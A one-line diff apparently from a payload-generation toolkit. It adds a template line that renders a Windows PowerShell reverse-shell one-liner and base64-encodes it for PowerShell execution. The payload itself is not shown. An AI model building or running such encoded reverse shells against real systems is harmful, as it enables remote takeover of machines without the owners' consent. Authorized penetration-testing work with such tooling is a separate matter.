@@ -1,0 +1,1 @@
+<% echo $(esh payloads/revshell-windows-powershell-oneliner) | python helper_scripts/encode.py --base64pwsh %>
